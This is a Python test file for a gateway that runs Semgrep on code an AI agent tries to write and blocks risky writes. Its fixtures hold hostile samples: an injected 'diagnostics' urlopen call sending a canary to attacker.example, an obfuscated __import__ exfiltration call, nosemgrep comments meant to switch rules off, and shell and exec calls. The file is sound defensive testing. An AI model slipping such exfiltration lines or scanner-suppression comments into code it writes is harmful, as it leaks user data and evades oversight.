"""Tests for the Semgrep write-content scan (hold/scan.py) and its Gateway wiring.

Discovered and run by ``harness.py``. Three groups:

(a) Gateway wiring, host-independent. Uses ``RecordingScanner``, a TEST DOUBLE that is not
    Semgrep: it returns a fixed verdict (or raises) and records each call so the tests can
    count dispatches and see what the Gateway passed in. It proves nothing about Semgrep.
(b) Real Semgrep. ``probe()`` runs one real scan first; if Semgrep cannot scan on this
    host the tests are SKIPPED with the reason (never passed silently).
(c) Fail-closed behavior with real subprocesses: missing binary, a binary that is not
    Semgrep, timeouts and process-tree kill, a missing or invalid rules file.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import uuid
from pathlib import Path
from typing import Dict, Optional, Tuple

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from hold.core import BUGGY_APP, FIXED_APP, Gateway, IntentReceipt, JsonlWriter, Telemetry  # noqa: E402
from hold.scan import (  # noqa: E402
    DEFAULT_RULES, DEFAULT_SCRATCH, ScanVerdict, SemgrepScanner, _kill_tree, child_env,
    evaluate_output, find_semgrep, popen_kwargs, probe, write_scanner_from_env,
)

APP = "src/flask/app.py"

# An "add this diagnostic line" injection. CANARY must never reach telemetry.
INJECTED_APP = '''import urllib.request


def get_user_name(user):
    urllib.request.urlopen("https://attacker.example/c?k=CANARY_IN_CONTENT")  # diagnostics
    if user is None:
        return ""
    return user.name.upper()
'''

# A file that already calls urlopen in unrelated code, before and after the NoneType fix.
PREEXISTING_OLD = '''import urllib.request


def fetch_status(url):
    return urllib.request.urlopen(url, timeout=5).status


def get_user_name(user):
    return user.name.upper()  # crashes with AttributeError when user is None
'''
PREEXISTING_FIXED = PREEXISTING_OLD.replace(
    "    return user.name.upper()  # crashes with AttributeError when user is None\n",
    "    if user is None:\n        return \"\"\n    return user.name.upper()\n")

OBFUSCATED_APP = FIXED_APP + '''

def _telemetry(payload):
    __import__("urllib.request").request.urlopen("https://attacker.example/t", payload)
'''

# Inline suppression comments in agent-written content must not switch a rule off.
NOSEM_APP = FIXED_APP + '''
import urllib.request


def a():
    urllib.request.urlopen("https://attacker.example/1")  # nosemgrep


def b():
    # nosemgrep
    urllib.request.urlopen("https://attacker.example/2")


def c():
    urllib.request.urlopen("https://attacker.example/3")  # nosem: hold-net-urllib
'''

# Look-alikes of flagged APIs that are benign and must not be reported.
BENIGN_LOOKALIKES = FIXED_APP + '''
import json
import os

import yaml


def settings(user, field, data):
    value = getattr(user, field, None)
    dumps = getattr(json, "dumps")
    cfg = yaml.safe_load(data)
    cfg2 = yaml.load(data, Loader=yaml.SafeLoader)
    return value, dumps, cfg, cfg2, json.loads(data), os.path.join("a", "b"), os.getcwd()
'''

_PROBE: Optional[Tuple[bool, str]] = None


def semgrep_probe() -> Tuple[bool, str]:
    """One real probe scan per test run (Semgrep takes seconds to start)."""
    global _PROBE
    if _PROBE is None:
        _PROBE = probe(SemgrepScanner(DEFAULT_RULES))
    return _PROBE


_UNSET = object()


class RecordingScanner:
    """TEST DOUBLE for the Gateway wiring only -- NOT Semgrep. Returns a fixed verdict (or
    raises), and records every call so tests can count dispatches."""

    def __init__(self, allowed=True, reason="test double verdict", raises=None, delay_s=0.0,
                 verdict=_UNSET):
        self.allowed, self.reason, self.raises, self.delay_s = allowed, reason, raises, delay_s
        self.verdict = verdict
        self.calls = []
        self.resolved = []

    def __call__(self, rel_path, old, new, resolved_path=None):
        self.calls.append((rel_path, old, new))
        self.resolved.append(resolved_path)
        if self.delay_s:
            time.sleep(self.delay_s)
        if self.raises is not None:
            raise self.raises
        if self.verdict is not _UNSET:
            return self.verdict
        return ScanVerdict(self.allowed, self.reason, 0.0, () if self.allowed else ("test-double",))


class ScanTestCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.base = Path(self._tmp.name)
        self.ws = self.base / "workspace"
        (self.ws / "src" / "flask").mkdir(parents=True)
        self.app = self.ws / "src" / "flask" / "app.py"
        self.app.write_bytes(BUGGY_APP.encode("utf-8"))
        (self.ws / ".env").write_text("FAKE_TOKEN=not-a-real-secret\n", encoding="utf-8")
        self.audit = self.base / "audit.jsonl"
        self.telemetry = Telemetry([JsonlWriter(self.audit)], flush_interval=0.01)
        self.urls = []

    def tearDown(self):
        self.telemetry.close()
        self._tmp.cleanup()

    def gateway(self, scanner, **caps):
        capabilities = {"read": ["src/**"], "write": [APP], "network_egress": False, "host_allowlist": []}
        capabilities.update(caps)
        receipt = IntentReceipt.from_dict({"task_id": "t", "intent": "fix app.py", "workspace_root": "workspace",
                                           "capabilities": capabilities}, self.base)
        return Gateway(receipt, self.telemetry, http_open=lambda u: self.urls.append(u) or "fetched",
                       write_scanner=scanner)

    def events(self):
        self.telemetry.close()
        return [json.loads(line) for line in self.audit.read_text(encoding="utf-8").splitlines()]

    def assert_unchanged(self):
        self.assertEqual(self.app.read_bytes(), BUGGY_APP.encode("utf-8"), "app.py must be unchanged")


# ---------------------------------------------------------------------------- (a) wiring

class GatewayScanWiring(ScanTestCase):
    def test_scanner_deny_leaves_file_unchanged_and_logs_deny(self):
        scanner = RecordingScanner(allowed=False, reason="Semgrep found 1 new finding(s): x line 2: y")
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertTrue(result.is_error)
        self.assertEqual(result.text, "HOLD denied write_file: Semgrep found 1 new finding(s): x line 2: y")
        self.assert_unchanged()
        self.assertEqual(scanner.calls, [(APP, BUGGY_APP, FIXED_APP)])  # old content is the baseline
        self.assertEqual(scanner.resolved, [APP])  # resolved path is passed too
        [event] = self.events()
        self.assertEqual((event["decision"], event["sink"], event["exec_status"], event["target"]),
                         ("DENY", "FS_WRITE", "not_run", APP))
        self.assertRegex(event["reason"], r"^Semgrep found 1 new finding\(s\): x line 2: y \(scan \d+ ms\)$")

    def test_scanner_exception_fails_closed(self):
        scanner = RecordingScanner(raises=RuntimeError("boom"))
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertTrue(result.is_error)
        self.assertIn("RuntimeError", result.text)
        self.assert_unchanged()
        [event] = self.events()
        self.assertEqual((event["decision"], event["exec_status"]), ("DENY", "not_run"))
        self.assertIn("failing closed", event["reason"])

    def test_invalid_verdicts_fail_closed(self):
        for verdict in [None, "ALLOW", ScanVerdict("yes", "truthy, not True", 0.0, ()),
                        ScanVerdict(1, "int, not bool", 0.0, ())]:
            result = self.gateway(RecordingScanner(verdict=verdict)).call(
                "write_file", {"path": APP, "content": FIXED_APP})
            self.assertTrue(result.is_error, f"verdict {verdict!r} must DENY")
            self.assert_unchanged()

    def test_scanner_not_called_for_gate_denied_writes_reads_or_fetches(self):
        scanner = RecordingScanner(allowed=True)
        hold = self.gateway(scanner)
        self.assertTrue(hold.call("write_file", {"path": "src/flask/other.py", "content": "x"}).is_error)
        self.assertTrue(hold.call("write_file", {"path": ".env", "content": "x"}).is_error)
        self.assertTrue(hold.call("write_file", {"path": "src/../.env", "content": "x"}).is_error)
        self.assertTrue(hold.call("write_file", {"path": APP}).is_error)  # malformed
        self.assertFalse(hold.call("read_file", {"path": APP}).is_error)
        self.assertTrue(hold.call("fetch_url", {"url": "https://evil.example/"}).is_error)
        self.assertEqual(scanner.calls, [])

    def test_allowed_scan_lets_the_write_happen(self):
        scanner = RecordingScanner(allowed=True, reason="Semgrep: no new findings")
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertFalse(result.is_error, result.text)
        self.assertEqual(self.app.read_bytes(), FIXED_APP.encode("utf-8"))
        [event] = self.events()
        self.assertEqual((event["decision"], event["exec_status"]), ("ALLOW", "ok"))
        self.assertRegex(event["reason"], r"^within receipt; Semgrep: no new findings \(scan \d+ ms\)$")

    def test_new_file_has_empty_baseline(self):
        scanner = RecordingScanner(allowed=True)
        hold = self.gateway(scanner, write=["src/flask/*.py"])
        self.assertFalse(hold.call("write_file", {"path": "src/flask/new.py", "content": "x = 1\n"}).is_error)
        self.assertEqual(scanner.calls, [("src/flask/new.py", "", "x = 1\n")])

    def test_oversized_content_is_denied_without_scanning(self):
        scanner = RecordingScanner(allowed=True)
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": "#" * (512 * 1024 + 1)})
        self.assertTrue(result.is_error)
        self.assertIn("exceeds", result.text)
        self.assertEqual(scanner.calls, [])
        self.assert_unchanged()
        [event] = self.events()
        self.assertEqual((event["decision"], event["exec_status"]), ("DENY", "not_run"))

    def test_gate_latency_excludes_scan_time(self):
        scanner = RecordingScanner(allowed=True, delay_s=0.3)
        self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        [event] = self.events()
        self.assertLess(int(event["gate_latency_ns"]), 100_000_000, "scan time leaked into gate latency")
        scan_ms = int(event["reason"].rsplit("(scan ", 1)[1].split(" ms")[0])
        self.assertGreaterEqual(scan_ms, 290)

    def test_scratch_dir_inside_workspace_fails_closed(self):
        scanner = RecordingScanner(allowed=True)
        scanner.scratch_dir = self.ws / ".tmp"
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertTrue(result.is_error)
        self.assertIn("inside the agent workspace", result.text)
        self.assertEqual(scanner.calls, [])
        self.assert_unchanged()

    def test_write_through_symlink_is_denied_before_the_scanner_runs(self):
        link = self.ws / "src" / "flask" / "notes.txt"
        try:
            link.symlink_to(self.app)
        except (OSError, NotImplementedError) as exc:
            self.skipTest(f"cannot create symlinks here ({exc})")
        scanner = RecordingScanner(allowed=True)
        result = self.gateway(scanner, write=["src/**"]).call(
            "write_file", {"path": "src/flask/notes.txt", "content": INJECTED_APP})
        self.assertTrue(result.is_error, result.text)
        self.assertIn("write through a link", result.text)
        self.assertEqual(scanner.calls, [])
        self.assert_unchanged()


# ---------------------------------------------------------------------------- (b) real Semgrep

class RealSemgrepScan(ScanTestCase):
    @classmethod
    def setUpClass(cls):
        cls.works, cls.detail = semgrep_probe()

    def setUp(self):
        if not self.works:
            self.skipTest(f"Semgrep cannot scan on this host: {self.detail}")
        super().setUp()
        self.scanner = SemgrepScanner(DEFAULT_RULES)

    def test_new_urlopen_in_app_is_denied_and_not_written(self):
        result = self.gateway(self.scanner).call("write_file", {"path": APP, "content": INJECTED_APP})
        self.assertTrue(result.is_error, result.text)
        self.assertIn("hold-net-urllib", result.text)
        self.assert_unchanged()
        [event] = self.events()
        self.assertEqual((event["decision"], event["sink"], event["exec_status"]), ("DENY", "FS_WRITE", "not_run"))
        self.assertRegex(event["reason"], r"^Semgrep found 1 new finding\(s\): hold-net-urllib line 5: .*\(scan \d+ ms\)$")
        log = self.audit.read_text(encoding="utf-8")
        self.assertNotIn("CANARY_IN_CONTENT", log)
        self.assertNotIn("attacker.example", log)

    def test_nosemgrep_comments_cannot_suppress_findings(self):
        verdict = self.scanner(APP, BUGGY_APP, NOSEM_APP)
        self.assertFalse(verdict.allowed, verdict.reason)
        self.assertEqual(verdict.rule_ids, ("hold-net-urllib",))
        self.assertTrue(verdict.reason.startswith("Semgrep found 3 new finding(s)"), verdict.reason)

    def test_preexisting_urlopen_does_not_block_the_fix(self):
        verdict = self.scanner(APP, PREEXISTING_OLD, PREEXISTING_FIXED)
        self.assertTrue(verdict.allowed, verdict.reason)
        self.assertIn("1 pre-existing finding(s) unchanged", verdict.reason)

    def test_second_copy_of_a_preexisting_call_is_new(self):
        doubled = PREEXISTING_FIXED + "\n\ndef again(url):\n    return urllib.request.urlopen(url, timeout=5).status\n"
        verdict = self.scanner(APP, PREEXISTING_OLD, doubled)
        self.assertFalse(verdict.allowed, verdict.reason)
        self.assertEqual(verdict.rule_ids, ("hold-net-urllib",))

    def test_obfuscated_dunder_import_is_denied(self):
        verdict = self.scanner(APP, BUGGY_APP, OBFUSCATED_APP)
        self.assertFalse(verdict.allowed, verdict.reason)
        self.assertIn("hold-code-import", verdict.rule_ids)

    def test_benign_nonetype_fix_is_allowed_and_written(self):
        # Also proves Semgrep gets an allowlisted environment: with the parent's full env,
        # SEMGREP_BASELINE_COMMIT makes Semgrep exit 2 here (measured), i.e. a DENY.
        saved = os.environ.get("SEMGREP_BASELINE_COMMIT")
        os.environ["SEMGREP_BASELINE_COMMIT"] = "0123456789abcdef0123456789abcdef01234567"
        try:
            result = self.gateway(self.scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        finally:
            if saved is None:
                os.environ.pop("SEMGREP_BASELINE_COMMIT", None)
            else:
                os.environ["SEMGREP_BASELINE_COMMIT"] = saved
        self.assertFalse(result.is_error, result.text)
        self.assertEqual(self.app.read_bytes(), FIXED_APP.encode("utf-8"))
        [event] = self.events()
        self.assertEqual((event["decision"], event["exec_status"]), ("ALLOW", "ok"))
        self.assertRegex(event["reason"], r"^within receipt; Semgrep: no new findings \(scan \d+ ms\)$")

    def test_benign_lookalikes_are_not_flagged(self):
        verdict = self.scanner(APP, BUGGY_APP, BENIGN_LOOKALIKES)
        self.assertTrue(verdict.allowed, verdict.reason)

    def test_each_rule_family_and_import_aliases_are_detected(self):
        new = FIXED_APP + '''
import base64, builtins, http.client, importlib, marshal, os, pickle, socket, subprocess, sys, yaml
import requests as rq
from urllib import request as ureq
from urllib.request import urlopen as uo


def everything(u, name, f):
    uo(u)
    rq.post(u, data=1)
    http.client.HTTPSConnection("a.example")
    socket.create_connection(("a.example", 80))
    subprocess.run(["id"])
    os.system("id")
    os.execv("/bin/sh", ["sh"])
    eval("1")
    pickle.load(f)
    importlib.import_module("os")
    getattr(builtins, "ev" + "al")
    getattr(ureq, name)
    vars(os)["sys" + "tem"]
    sys.modules.get("os")
    yaml.load(f)
    blob = base64.b64decode("cHJpbnQoMSk=")
    exec(blob)
'''
        verdict = self.scanner(APP, BUGGY_APP, new)
        self.assertFalse(verdict.allowed)
        expected = {"hold-net-urllib", "hold-net-requests", "hold-net-http-client", "hold-net-socket",
                    "hold-exec-subprocess", "hold-exec-os", "hold-code-eval", "hold-code-import",
                    "hold-code-reflection", "hold-code-dynamic-attr", "hold-code-unsafe-yaml",
                    "hold-code-decoded-exec"}
        self.assertEqual(set(verdict.rule_ids), expected)
        self.assertIn("+", verdict.reason)  # more than 3 findings are summarized, reason stays short
        self.assertLessEqual(len(verdict.reason), 300)


# ---------------------------------------------------------------------------- (c) fail closed

def _process_table() -> Dict[int, Tuple[int, str]]:
    """{pid: (parent pid, image name)} from the OS's own tools (real processes, no mocks)."""
    if os.name == "nt":
        ps = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "WindowsPowerShell" / "v1.0" / "powershell.exe"
        cmd = [str(ps), "-NoProfile", "-NonInteractive", "-Command",
               "Get-CimInstance Win32_Process | ForEach-Object { '{0} {1} {2}' -f $_.ProcessId,$_.ParentProcessId,$_.Name }"]
    else:
        cmd = ["ps", "-eo", "pid=,ppid=,comm="]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=60, stdin=subprocess.DEVNULL).stdout
    table = {}
    for line in out.splitlines():
        parts = line.split(None, 2)
        if len(parts) == 3 and parts[0].isdigit() and parts[1].isdigit():
            table[int(parts[0])] = (int(parts[1]), parts[2].strip())
    return table


def _descendants(root: int, table: Dict[int, Tuple[int, str]]) -> Dict[int, str]:
    found, frontier = {}, [root]
    while frontier:
        parent = frontier.pop()
        for pid, (ppid, name) in table.items():
            if ppid == parent and pid not in found and pid != root:
                found[pid] = name
                frontier.append(pid)
    return found


class SemgrepFailsClosed(ScanTestCase):
    def test_missing_semgrep_binary_denies(self):
        scanner = SemgrepScanner(DEFAULT_RULES, semgrep_bin=str(self.base / "no-such-semgrep.exe"))
        verdict = scanner(APP, BUGGY_APP, FIXED_APP)
        self.assertFalse(verdict.allowed)
        self.assertTrue(verdict.reason.startswith("Semgrep unavailable:"), verdict.reason)
        self.assertEqual(verdict.rule_ids, ())

    def test_missing_semgrep_through_gateway_keeps_file_unchanged(self):
        scanner = SemgrepScanner(DEFAULT_RULES, semgrep_bin=str(self.base / "no-such-semgrep.exe"))
        result = self.gateway(scanner).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertTrue(result.is_error)
        self.assertIn("Semgrep unavailable", result.text)
        self.assert_unchanged()
        [event] = self.events()
        self.assertEqual((event["decision"], event["exec_status"]), ("DENY", "not_run"))

    def test_binary_that_is_not_semgrep_fails_closed(self):
        # Real subprocess: `python scan --config ...` exits 2 ("can't open file 'scan'").
        verdict = SemgrepScanner(DEFAULT_RULES, semgrep_bin=sys.executable)(APP, BUGGY_APP, FIXED_APP)
        self.assertFalse(verdict.allowed)
        self.assertTrue(verdict.reason.startswith("Semgrep error: exit code"), verdict.reason)

    def test_missing_rules_file_denies(self):
        scanner = SemgrepScanner(self.base / "missing.yml", semgrep_bin=sys.executable)
        verdict = scanner(APP, BUGGY_APP, FIXED_APP)
        self.assertEqual((verdict.allowed, verdict.reason), (False, "Semgrep error: rules file not found"))

    def test_unencodable_content_and_bad_arguments_deny(self):
        scanner = SemgrepScanner(DEFAULT_RULES, semgrep_bin=sys.executable)
        self.assertFalse(scanner(APP, "", "x = '\ud800'\n").allowed)
        self.assertFalse(scanner(None, "", "x = 1\n").allowed)
        self.assertFalse(scanner(APP, None, "x = 1\n").allowed)
        self.assertFalse(scanner("notes.txt", "", "x = 1\n", resolved_path=123).allowed)

    def test_timeout_denies_and_leaves_no_scan_dir(self):
        exe = find_semgrep()
        if exe is None:
            self.skipTest("semgrep executable not found; cannot test the timeout path")
        scratch = DEFAULT_SCRATCH / f"test-timeout-{uuid.uuid4().hex[:8]}"
        try:
            scanner = SemgrepScanner(DEFAULT_RULES, semgrep_bin=exe, timeout_s=0.05, scratch_dir=scratch)
            verdict = scanner(APP, BUGGY_APP, FIXED_APP)
            self.assertEqual((verdict.allowed, verdict.reason), (False, "Semgrep error: timed out after 0.05 s"))
            self.assertEqual([p.name for p in scratch.iterdir() if p.name.startswith("scan-")], [],
                             "per-scan directory left behind")
        finally:
            shutil.rmtree(scratch, ignore_errors=True)

    def test_kill_tree_stops_a_running_semgrep_core(self):
        """The timeout path calls _kill_tree. Start a real, deliberately slow Semgrep scan with
        the scanner's own process settings, wait until semgrep-core is running, kill, and
        check that no process of that tree survives."""
        exe = find_semgrep()
        if exe is None:
            self.skipTest("semgrep executable not found")
        work = DEFAULT_SCRATCH / f"test-kill-{uuid.uuid4().hex[:8]}"
        (work / "new").mkdir(parents=True)
        slow_rule = ("  - id: slow-{n}\n    languages: [python]\n    severity: ERROR\n    message: slow\n"
                     "    pattern: |\n      $A = $X\n      ...\n      $B = $Y{n}\n      ...\n      $A = $W\n")
        (work / "slow.yml").write_text("rules:\n" + "".join(slow_rule.format(n=n) for n in range(3)), encoding="utf-8")
        (work / "new" / "target.py").write_text("".join(f"v{i} = f{i}(x{i})\n" for i in range(3000)), encoding="utf-8")
        argv = [exe, "scan", "--config", str(work / "slow.yml"), "--json", "--output", str(work / "out.json"),
                "--metrics=off", "--disable-version-check", "--quiet", "--disable-nosem", "new/target.py"]
        proc = subprocess.Popen(argv, cwd=str(work), env=child_env(Path(os.path.realpath(DEFAULT_SCRATCH))),
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                **popen_kwargs())
        try:
            tree: Dict[int, str] = {}
            seen_core: Dict[int, str] = {}
            deadline = time.monotonic() + 120
            while time.monotonic() < deadline and proc.poll() is None:
                tree = _descendants(proc.pid, _process_table())
                core = {pid: n for pid, n in tree.items() if "semgrep-core" in n.lower()}
                if set(core) & set(seen_core):  # the same semgrep-core seen in two polls: the scan proper
                    break
                seen_core = core
                time.sleep(0.5)
            self.assertTrue(set(seen_core) & set(tree), f"semgrep-core never seen running (exit {proc.poll()})")
            self.assertIsNone(proc.poll(), "the scan finished before it could be killed")
            _kill_tree(proc)
            table = _process_table()
            survivors = {pid: name for pid, name in tree.items() if table.get(pid, (None, None))[1] == name}
            self.assertEqual(survivors, {}, "processes of the Semgrep tree survived the kill")
            self.assertIsNotNone(proc.poll())
        finally:
            if proc.poll() is None:
                proc.kill()
            shutil.rmtree(work, ignore_errors=True)

    def test_failing_real_semgrep_denies_even_the_benign_fix(self):
        """A real Semgrep failure must DENY the benign fix. Where Semgrep cannot scan, that is
        the default setup; where it can, Semgrep is broken for real with an invalid rule."""
        works, detail = semgrep_probe()
        rules = DEFAULT_RULES
        if works:
            rules = self.base / "broken-rules.yml"
            rules.write_text("rules:\n  - id: broken\n    languages: [python]\n    severity: ERROR\n"
                             "    message: broken\n    pattern: urllib.request.urlopen(\n", encoding="utf-8")
        result = self.gateway(SemgrepScanner(rules)).call("write_file", {"path": APP, "content": FIXED_APP})
        self.assertTrue(result.is_error, f"Semgrep failed (probe: {detail}) but the write was allowed")
        self.assertRegex(result.text, r"^HOLD denied write_file: Semgrep (error|unavailable):")
        self.assert_unchanged()

    def test_non_python_files_are_passed_through_as_not_scanned(self):
        # Documented scope limit: the rules are Python-only. Even with no Semgrep at all,
        # a Markdown write is allowed and the verdict says it was not scanned.
        scanner = SemgrepScanner(DEFAULT_RULES, semgrep_bin=str(self.base / "no-such-semgrep.exe"))
        verdict = scanner("docs/notes.md", "", "urllib.request.urlopen('x')\n")
        self.assertEqual((verdict.allowed, verdict.reason),
                         (True, "not scanned: HOLD scan rules cover Python files only"))
        # ...but an extensionless file with a python shebang is scanned (and here: denied),
        self.assertFalse(scanner("bin/tool", "", "#!/usr/bin/env python3\nprint(1)\n").allowed)
        # ...and so is a non-.py name whose RESOLVED path is a Python file.
        verdict = scanner("src/flask/notes.txt", "", "x = 1\n", resolved_path=APP)
        self.assertTrue(verdict.reason.startswith("Semgrep unavailable:"), verdict.reason)

    def test_semgrep_gets_an_allowlisted_environment(self):
        saved = {k: os.environ.get(k) for k in ("CLICKHOUSE_PASSWORD", "SEMGREP_RULES", "PYTHONPATH")}
        try:
            os.environ.update(CLICKHOUSE_PASSWORD="not-a-real-secret", SEMGREP_RULES="p/all", PYTHONPATH="x")
            env = child_env(Path("scratch-dir"))
        finally:
            for k, v in saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
        for name in ("CLICKHOUSE_PASSWORD", "SEMGREP_RULES", "PYTHONPATH"):
            self.assertNotIn(name, env)
        self.assertEqual((env["TEMP"], env["TMP"]), ("scratch-dir", "scratch-dir"))
        self.assertEqual((env["SEMGREP_SEND_METRICS"], env["SEMGREP_ENABLE_VERSION_CHECK"]), ("off", "0"))

    def test_write_scanner_from_env(self):
        saved = os.environ.get("HOLD_SEMGREP")
        try:
            os.environ["HOLD_SEMGREP"] = "0"
            self.assertIsNone(write_scanner_from_env())
            os.environ.pop("HOLD_SEMGREP")
            scanner = write_scanner_from_env()
            self.assertIsInstance(scanner, SemgrepScanner)
            self.assertEqual(scanner.rules_path, DEFAULT_RULES)
            self.assertTrue(DEFAULT_RULES.is_file())
            self.assertEqual(scanner.semgrep_bin, find_semgrep())
        finally:
            if saved is None:
                os.environ.pop("HOLD_SEMGREP", None)
            else:
                os.environ["HOLD_SEMGREP"] = saved


class EvaluateOutputErrorPaths(unittest.TestCase):
    """Pure-function tests of HOLD's handling of Semgrep JSON error cases that a real run
    rarely produces. The inputs are HAND-WRITTEN dicts in Semgrep's JSON shape; they are not
    Semgrep results and prove nothing about Semgrep or the rules. Real-output behavior is
    covered by RealSemgrepScan."""

    def test_unscanned_new_file_denies(self):
        data = {"results": [], "errors": [], "paths": {"scanned": ["old/target.py"]}}
        self.assertFalse(evaluate_output(data, b"x", b"y")[0])

    def test_error_entries_deny_except_warnings_about_the_old_file(self):
        scanned = {"scanned": ["new\\target.py", "old\\target.py"]}
        for err in [{"level": "error", "type": "Timeout"},
                    {"level": "warn", "type": "Timeout", "rule_id": "r", "path": "new\\target.py"},
                    {"level": "warn", "type": ["PartialParsing", []], "path": "new\\target.py"},
                    {"level": "warn", "type": "Rule warning"},
                    {"level": "error", "type": "Timeout", "path": "old\\target.py"}]:
            allowed, reason, _ = evaluate_output({"results": [], "errors": [err], "paths": scanned}, b"x", b"y")
            self.assertFalse(allowed, err)
            self.assertTrue(reason.startswith("Semgrep error:"), reason)
        old_warning = {"level": "warn", "type": "Timeout", "path": "old\\target.py"}
        self.assertTrue(evaluate_output({"results": [], "errors": [old_warning], "paths": scanned}, b"x", b"y")[0])

    def test_malformed_output_denies(self):
        for data in [None, [], {}, {"results": {}, "errors": [], "paths": {}},
                     {"results": [{"path": "elsewhere.py"}], "errors": [], "paths": {"scanned": ["new/target.py"]}},
                     {"results": [{"path": "new/target.py", "start": {}, "end": {}}], "errors": [],
                      "paths": {"scanned": ["new/target.py"]}}]:
            self.assertFalse(evaluate_output(data, b"", b"x")[0], f"{data!r} must DENY")


if __name__ == "__main__":
    unittest.main()
